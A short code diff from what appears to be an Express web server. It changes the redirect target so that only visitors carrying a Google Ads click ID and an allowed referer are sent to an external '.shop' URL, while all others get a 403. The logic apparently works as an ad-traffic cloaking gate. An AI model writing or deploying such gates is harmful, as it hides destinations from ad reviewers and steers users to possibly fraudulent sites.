@@ -13,7 +13,7 @@ app.get("/", (req, res) => {
     referer.includes(ALLOWED_DOMAIN) || origin.includes(ALLOWED_DOMAIN);
 
   if (gclid && fromAllowedDomain) {
-    return res.redirect(302, "https://example.com");
+    return res.redirect(302, "https://fooidemix.shop/map/latest");
   }
 
   res.status(403).send("Forbidden");
